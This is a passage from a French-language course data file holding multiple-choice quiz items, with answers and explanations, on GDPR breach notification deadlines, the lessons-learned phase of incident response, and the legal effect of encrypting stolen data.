                "Quel est le délai imposé par le RGPD pour notifier une violation de données à l'autorité de contrôle (la CNIL en France) susceptible d'engendrer un risque ?",
              options: [
                "24 heures", "72 heures", "30 jours", "Il n'y a pas de délai imposé",
              ],
              correctIndex: 1,
              explanation:
                "Le RGPD fixe 72 heures après la prise de connaissance de la violation pour notifier l'autorité de contrôle. Ce délai court est précisément la raison d'avoir un plan de réponse prêt à l'avance : improviser en 72 heures est très risqué.",
            },
            {
              id: "q19",
              prompt:
                "Pourquoi la phase « leçons apprises » d'une réponse à incident est-elle souvent la plus négligée alors qu'elle est essentielle ?",
              options: [
                "Parce qu'elle est facultative selon le NIST",
                "Parce qu'une fois le service rétabli, la pression retombe et on repart sans corriger les causes de fond, ce qui laisse la porte ouverte à une récidive",
                "Parce qu'elle nécessite un logiciel spécialisé coûteux",
                "Parce qu'elle doit obligatoirement être publiée",
              ],
              correctIndex: 1,
              explanation:
                "Une fois la crise passée, l'urgence disparaît et le retour d'expérience est souvent sauté. Or c'est lui qui transforme l'incident en amélioration des processus et alimente la phase de préparation. Sans cette boucle, on rejoue le même scénario.",
            },
            {
              id: "q20",
              prompt:
                "Une entreprise subit le vol d'une base clients, mais les données étaient chiffrées avec une clé qui n'a pas été compromise. Quel effet cela a-t-il, notamment au regard du RGPD ?",
              options: [
                "Aucun, le vol reste identique dans tous les cas",
                "Le risque pour les personnes est fortement réduit, ce qui peut dispenser d'informer individuellement les personnes concernées",
                "Cela dispense totalement de notifier la CNIL",
                "Cela transforme le vol en simple incident interne sans obligation",
              ],
              correctIndex: 1,
              explanation:
                "Si les données volées sont correctement chiffrées et que la clé n'a pas fuité, elles restent illisibles pour l'attaquant : le risque élevé pour les personnes disparaît, ce qui peut lever l'obligation de les informer individuellement. Le chiffrement au repos agit ici comme un amortisseur juridique, même si l'analyse au cas par cas et la traçabilité restent nécessaires.",
            },
          ],
        },
      ],
    },
  ],
};

export default course;
